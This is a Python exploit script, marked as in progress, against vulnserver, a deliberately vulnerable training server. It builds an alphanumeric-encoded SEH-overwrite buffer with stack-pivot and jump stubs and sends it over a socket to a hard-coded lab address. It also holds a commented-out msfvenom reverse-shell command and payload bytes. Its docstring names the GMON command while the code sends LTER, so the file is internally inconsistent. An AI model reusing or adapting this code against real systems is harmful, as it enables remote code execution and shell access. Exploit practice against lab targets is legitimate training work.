#!/usr/bin/python3
"""Exploit code for vulnserver GMON seh overwrite with egghunter"""

### IN PROGRESS!!!!!!!


import socket
import struct

def add_shellcode() -> bytes:
    """ Returns shellcode generated by msfvenom"""
    # msfvenom -p windows/shell_reverse_tcp LHOST=eth0 LPORT=4444 -f c -b '\x00' BufferRegister=ESP

    # ""
    # ""
    # ""
    # "\xc9\xd5\x9b\x90\x1e\x83\x68\x9e\xeb\xc7\x36\x83\xea\x04\x4d"
    # "\xbf\x67\xab\x81\x49\x33\x88\x05\x11\xe7\xb1\x1c\xff\x46\xcd"
    # "\x7e\xa0\x37\x6b\xf5\x4d\x23\x06\x54\x1a\x80\x2b\x66\xda\x8e"
    # "\x3c\x15\xe8\x11\x97\xb1\x40\xd9\x31\x46\xa6\xf0\x86\xd8\x59"
    # "\xfb\xf6\xf1\x9d\xaf\xa6\x69\x37\xd0\x2c\x69\xb8\x05\xe2\x39"
    # "\x16\xf6\x43\xe9\xd6\xa6\x2b\xe3\xd8\x99\x4c\x0c\x33\xb2\xe7"
    # "\xf7\xd4\x7d\x5f\x94\x47\x16\xa2\x5a\x99\xba\x2b\xbc\xf3\x52"
    # "\x7a\x17\x6c\xca\x27\xe3\x0d\x13\xf2\x8e\x0e\x9f\xf1\x6f\xc0"
    # "\x68\x7f\x63\xb5\x98\xca\xd9\x10\xa6\xe0\x75\xfe\x35\x6f\x85"
    # "\x89\x25\x38\xd2\xde\x98\x31\xb6\xf2\x83\xeb\xa4\x0e\x55\xd3"
    # "\x6c\xd5\xa6\xda\x6d\x98\x93\xf8\x7d\x64\x1b\x45\x29\x38\x4a"
    # "\x13\x87\xfe\x24\xd5\x71\xa9\x9b\xbf\x15\x2c\xd0\x7f\x63\x31"
    # "\x3d\xf6\x8b\x80\xe8\x4f\xb4\x2d\x7d\x58\xcd\x53\x1d\xa7\x04"
    # "\xd0\x2d\xe2\x04\x71\xa6\xab\xdd\xc3\xab\x4b\x08\x07\xd2\xcf"
    # "\xb8\xf8\x21\xcf\xc9\xfd\x6e\x57\x22\x8c\xff\x32\x44\x23\xff"
    # "\x16";
    shellcode = b""
    shellcode += b"\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
    shellcode += b"\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
    shellcode += b"\x05\x46\x13\x67\x46" ## add  eax, 0x46671346
    shellcode += b"\x05\x46\x12\x56\x35" ## add  eax, 0x35561246
    shellcode += b"\x05\x34\x12\x35\x33" ## add  eax, 0x33351234
    shellcode += b"\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
    shellcode += b"\x50"                 ## push eax
    shellcode += b"\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
    shellcode += b"\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
    shellcode += b"\x05\x60\x02\x02\x02" ## add  eax, 0x02020260
    shellcode += b"\x05\x60\x02\x01\x01" ## add  eax, 0x01010260
    shellcode += b"\x50"                 ## push eax
    shellcode += b"\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
    shellcode += b"\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
    shellcode += b"\x05\x15\x46\x33\x11" ## add  eax, 0x11334615
    shellcode += b"\x05\x14\x45\x22\x21" ## add  eax, 0x21224514
    shellcode += b"\x05\x14\x33\x22\x11" ## add  eax, 0x11223314
    shellcode += b"\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
    shellcode += b"\x50"                 ## push eax
    shellcode += b"\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
    shellcode += b"\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
    shellcode += b"\x05\x47\x65\x32\x24" ## add  eax, 0x24326547
    shellcode += b"\x05\x46\x54\x32\x24" ## add  eax, 0x24325446
    shellcode += b"\x05\x45\x44\x32\x23" ## add  eax, 0x23324445
    shellcode += b"\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
    shellcode += b"\x50"                 ## push eax
    shellcode += b"\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
    shellcode += b"\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
    shellcode += b"\x05\x52\x32\x44\x17" ## add  eax, 0x17443252
    shellcode += b"\x05\x41\x32\x43\x16" ## add  eax, 0x16433241
    shellcode += b"\x05\x42\x32\x33\x15" ## add  eax, 0x15333242
    shellcode += b"\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
    shellcode += b"\x50"                 ## push eax
    shellcode += b"\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
    shellcode += b"\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
    shellcode += b"\x05\x27\x72\x43\x53" ## add  eax, 0x53437227
    shellcode += b"\x05\x16\x72\x42\x44" ## add  eax, 0x44427216
    shellcode += b"\x50"                 ## push eax
    shellcode += b"\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
    shellcode += b"\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
    shellcode += b"\x05\x61\x43\x64\x74" ## add  eax, 0x74644361
    shellcode += b"\x05\x52\x43\x63\x64" ## add  eax, 0x64634352
    shellcode += b"\x05\x31\x33\x43\x54" ## add  eax, 0x54433331
    shellcode += b"\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
    shellcode += b"\x50"                 ## push eax
    shellcode += b"\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
    shellcode += b"\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
    shellcode += b"\x05\x55\x12\x23\x10" ## add  eax, 0x10231255
    shellcode += b"\x05\x54\x12\x23\x10" ## add  eax, 0x10231254
    shellcode += b"\x50"                 ## push eax
    return shellcode


def build_buf(shellcode: bytes = b"") -> bytes:
    """ Builds buffer for GMON exploit of vulnserver with egghunter"""
    # Bad chars: \x00
    # *************
    # Buffer Layout
    # *************
    #
    # LTER /.../
    # ----------------------------
    # Overflow 3427 bytes :: SEH record (nseh field) at (offset 3514)
    #
    # 3rd esp adjustment
    # push esp # pop eax # sub ax, byte +0x4b # push eax # pop esp
    #
    # 5. 2nd esp adjustment
    #    push esp # pop eax # sub al, 0x2a # push eax # pop esp
    #
    # 6. long jump sling \x54\x5b + slink \x81\xeb\xb9\x0d\x00\x00\xff\xd3
    #
    # Expand overflow to original 3514 bytes
    #
    # 2. nseh - 0x04750674 net jump over seh to egghunter
    #
    # 1. seh - 0x6250172b : pop ebx # pop ebp # ret
    #
    # 3. push esp, pop eax
    #
    # 3. esp adjustment
    #    add ax, 0x134b # push eax # pop esp
    #
    # 4. short jumpback slink \xeb\x80\x90\x90
    # 
    # filler to 5012 bytes
    buf = b"\x54\x58\x2c\x4b\x50\x5c"
    buf += add_shellcode()
    buf += b"A" * (3427 - len(buf))
    buf += b"\x54\x58\x2c\x2a\x50\x5c" # 2nd esp adjustment
    buf += b"\x54\x5b" # start of long jump
    buf += b"\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
    buf += b"\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
    buf += b"\x05\x41\x76\x65\x07" ## add  eax, 0x07657641
    buf += b"\x05\x40\x75\x54\x06" ## add  eax, 0x06547540
    buf += b"\x50"                 ## push eax
    buf += b"A" * (3514 - len(buf))
    buf += struct.pack("<L", 0x04750674)
    buf += struct.pack("<L", 0x6250172b)
    buf += b"\x54\x58" # save esp to eax
    buf += b"\x66\x05\x4b\x13\x50\x5c" # esp adjustment
    buf += b"\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
    buf += b"\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
    buf += b"\x05\x76\x40\x50\x50" ## add  eax, 0x50504076
    buf += b"\x05\x75\x40\x40\x40" ## add  eax, 0x40404075
    buf += b"\x50"                 ## push eax
    buf += b"D" * (4000 - len(buf))
    return buf


def send_exploit(ip: str, port: int) -> None:
    """Sends exploit for vulnserver"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    try:
        sock.connect((ip, port))
        print(sock.recv(1024).decode())
    except Exception as msg:
        print(msg)
        exit()

    sock.settimeout(5)
    sock.send(b"LTER /.../" + build_buf(add_shellcode()))
    try:
        print(sock.recv(1024))
    except socket.timeout:
        pass
    finally:
        sock.close()


if __name__ == "__main__":
    send_exploit("192.168.99.100", 9999)
